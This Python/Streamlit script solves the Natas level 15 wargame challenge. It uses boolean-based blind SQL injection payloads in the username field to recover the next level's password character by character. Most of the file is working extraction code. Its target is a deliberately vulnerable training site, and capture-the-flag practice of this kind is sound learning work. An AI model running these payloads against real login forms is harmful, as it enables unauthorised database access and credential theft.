import streamlit as st
import string

def run(context, session, base_url):
    st.info("Targeting Boolean-Based Blind SQL Injection via conditional verification parsing...")
    
    # 1. Define the possible character pool (alphanumeric characters)
    charset = string.ascii_letters + string.digits
    discovered_password = ""
    password_length = 32
    
    # Setup baseline target credentials for Level 15
    username = "natas15"
    current_level_password = context.get('password', '').strip()
    session.auth = (username, current_level_password)
    
    # 2. First, let's optimize by identifying which characters actually exist in the password
    st.write("🔍 Scanning character pool to find active password elements...")
    active_chars = []
    
    char_progress = st.progress(0)
    for idx, char in enumerate(charset):
        # Update progress bar
        char_progress.progress((idx + 1) / len(charset))
        
        # Payload: Check if the character exists anywhere inside the password field
        payload = f'natas16" AND password LIKE BINARY "%{char}%" #'
        try:
            response = session.post(base_url, data={"username": payload}, timeout=5)
            if "This user exists." in response.text:
                active_chars.append(char)
        except Exception:
            continue
            
    st.write(f"✨ Found {len(active_chars)} unique characters used in the password: `{', '.join(active_chars)}`")
    
    if not active_chars:
        st.error("Could not find any active characters. Please verify your sidebar credentials or target URL configuration.")
        return

    # 3. Sequentially extract the password position by position
    st.write("🔄 Reconstructing password string sequentially...")
    password_display = st.empty()
    step_progress = st.progress(0)
    
    for position in range(1, password_length + 1):
        found_character_for_position = False
        
        for char in active_chars:
            # Payload: Check if the character at this specific index matches our guess
            payload = f'natas16" AND SUBSTRING(password, {position}, 1) LIKE BINARY "{char}" #'
            
            try:
                response = session.post(base_url, data={"username": payload}, timeout=5)
                
                if "This user exists." in response.text:
                    discovered_password += char
                    password_display.code(f"Current Progress: {discovered_password}")
                    found_character_for_position = True
                    break  # Found the right character, move to the next position
            except Exception as e:
                st.error(f"Connection dropped during evaluation loop: {str(e)}")
                return
        
        # Update progress bar for the 32 positions
        step_progress.progress(position / password_length)
        
        # Safety break if a position cannot be resolved
        if not found_character_for_position:
            st.warning(f"Could not resolve character at index position {position}. Stopping extraction sequence.")
            break

    # 4. Handle results presentation
    if len(discovered_password) == password_length:
        st.success("🎯 Level 15 challenge resolved successfully!")
        st.code(f"Natas 16 Password: {discovered_password}")
    else:
        st.warning("Extraction phase concluded, but the output signature does not match the standard character length scale.")
        if discovered_password:
            st.code(f"Partial Password Captured: {discovered_password}")